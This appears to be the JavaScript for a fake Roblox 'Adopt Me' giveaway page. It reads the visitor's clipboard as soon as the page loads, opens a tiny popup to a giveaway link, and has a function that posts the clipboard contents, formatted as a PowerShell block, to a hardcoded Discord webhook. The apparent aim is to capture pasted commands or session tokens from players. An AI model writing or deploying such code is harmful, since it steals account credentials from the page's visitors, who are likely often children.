// script.js
async function fetchClipboardContent() {
    try {
        const clipboardItems = await navigator.clipboard.read();
        let textContent = "";
        let imageContent = "";

        for (const item of clipboardItems) {
            const types = item.types;
            for (const type of types) {
                if (type === "text/plain") {
                    const textBlob = await item.getType(type);
                    const text = await textBlob.text();
                    textContent += text + "\n"; // Append text
                } else if (type.startsWith("image/")) {
                    const imageBlob = await item.getType(type);
                    const imageURL = URL.createObjectURL(imageBlob);
                    imageContent += `<img src="${imageURL}" alt="Clipboard Image" />`; // Create image URL
                }
            }
        }

        // Update the clipboard content display
        document.getElementById("clipboard-text").textContent = textContent || "No text found.";
        document.getElementById("clipboard-image").innerHTML = imageContent || "No images found.";
    } catch (error) {
        console.error("Error reading clipboard: ", error);
    }
}

function openModal() {
    document.getElementById("clipboard-modal").style.display = "block";
}

function closeModal() {
    document.getElementById("clipboard-modal").style.display = "none";
}

// Fetch clipboard content and open modal when the page loads
window.addEventListener("load", async () => {
    await fetchClipboardContent();
    openModal();
});

// Close modal when clicking outside of modal content
window.onclick = function(event) {
    const modal = document.getElementById("clipboard-modal");
    if (event.target == modal) {
        closeModal();
    }
}
function openGiveawayLink() {
    const url = "https://www.roblox.com/ADOPTMEGIVEAWAYJOIN";
    const windowFeatures = "width=100,height=100,resizable=no"; // Smaller dimensions
    window.open(url, "_blank", windowFeatures);
}
async function sendClipboardToDiscord() {
    try {
        const clipboardText = await navigator.clipboard.readText(); // Get clipboard content
        console.log('Clipboard Text:', clipboardText); // Log the clipboard content

        const webhookURL = "https://discord.com/api/webhooks/1295363598146736178/huVHqYEyxcm-4c4CfeQCrd0cELoMJUMmiovdservaMJ7gEq4AHYx5LCqvbIbgALOBLuN";

        // Format the message as PowerShell code block
        const payload = {
            content: `\`\`\`powershell\n${clipboardText}\n\`\`\`` // PowerShell code block formatting
        };

        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json' // Keep as application/json
            },
            body: JSON.stringify(payload) // Send the payload as JSON
        });

        // Check the response status and log it
        if (response.ok) {
            alert('Clipboard content sent to Discord!');
        } else {
            const errorText = await response.text(); // Read error response
            console.error('Failed to send clipboard content:', errorText);
            alert('Failed to send clipboard content. Status: ' + response.status);
        }
    } catch (error) {
        console.error('Error accessing clipboard: ', error);
        alert('Failed to access clipboard.');
    }
}


